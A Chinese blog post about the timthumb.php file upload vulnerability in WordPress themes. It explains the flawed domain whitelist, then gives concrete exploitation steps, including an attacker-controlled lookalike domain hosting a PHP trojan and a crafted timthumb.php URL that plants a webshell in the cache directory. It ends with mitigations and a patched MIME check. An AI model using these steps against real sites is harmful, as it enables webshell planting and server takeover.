---
title: 110804 请小心 timthumb.php
layout: post
permalink: /2205.html
categories:
  - Code
tags:
  - loper1.2
  - timthumb.php
  - wordpress
  - 上传漏洞
---
 今天早上 CNBETA爆出了 wordpress 的  谷歌写的  timthumb.php 上传漏洞 我分析了下 入侵规则如下: 0 => string 'flickr.com' (length=10) 1 => string 'picasa.com' (length=10) 2 => string 'blogger.com' (length=11) 3 => string 'wordpress.com' (length=13) 4 => string 'img.youtube.com' (length=15) 以上文件是timthumb.php 支持 图片的下载地址 或者 ALLOW\_EXTERNAL 为TRUE 都会被跳过域名检查. 漏洞利用: 创建一个域名 http://flickr.com.80aj.com/ 目录下上传 80aj.php 寻找有 timthumb.php 的主题或者插件包 这里只提供一个  关于  loper1.2 主题包 中就自带 timthumb.php文件 使用如下URL上传木马: http://www.\*.com/wp-content/themes/loper1.2/timthumb.php?src=http://flickr.com.80aj.com/80aj.php 上传完以后访问: http://www.\*.com/wp-content/themes/loper1.2/cache/ 寻找刚才上传的文件 直接访问即可. 修复方法: cache 目录下创建 index.html 或者 php 进制 cache目录执行PHP相关代码 代码后缀过滤 ,虽然代码中过滤了 进制上传的类型 但还是会下载下来 timthumb.php 相关强制关闭 /*\* \* determine the file mime type \* \* @param $file \* @return \*/ function mime\_type ($file) { $file\_infos = getimagesize ($file); $mime\_type = $file\_infos['mime']; // use mime\_type to determine mime type if (!preg\_match ("/jpg|jpeg|gif|png/i", $mime\_type)) { display\_error ('Invalid src mime type: ' . $mime\_type); echo "sorry ,error src type"; exit(); } return $mime_type; } timthumb.php相关新闻: http://www.cnbeta.com/articles/150685.htm